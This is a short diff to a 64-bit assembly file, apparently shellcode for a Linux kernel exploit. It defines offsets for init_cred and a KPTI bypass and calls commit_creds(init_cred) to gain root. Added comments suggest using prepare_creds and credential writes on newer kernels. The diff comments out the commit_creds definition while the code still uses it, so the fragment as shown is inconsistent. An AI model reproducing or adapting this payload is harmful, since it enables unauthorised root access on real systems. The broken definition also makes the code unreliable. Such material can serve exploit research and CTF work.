@@ -1,6 +1,8 @@
-; nasm -f bin ./shellcode.S && xxd -i shellcode > shellcode.h 
+; nasm -f bin ./shellcode.S && xxd -i shellcode > shellcode.h
 BITS 64
-  commit_creds  equ 0x1097210
+  ; commit_creds  equ 0x1097210
+
+  ; find/g 0xffffffff81000000 , 0xffffffff81800000, 0x1ffffffffff
   init_cred     equ 0x1e39080
   ; kpti_bypass   equ 0x180021c
   kpti_bypass   equ 0x18001af
@@ -15,6 +17,8 @@ a:
   ; commit_creds(init_cred);
   ; doesn't work with newer version try to corrupt
   ; current task creds instead
+  ; btw: also doesn't work with bleeding edge kernels,
+  ;   try prepare_creds, make root (with writes), commit_creds
   lea rdi, [r15 + init_cred]
   lea rax, [r15 + commit_creds]
   call rax
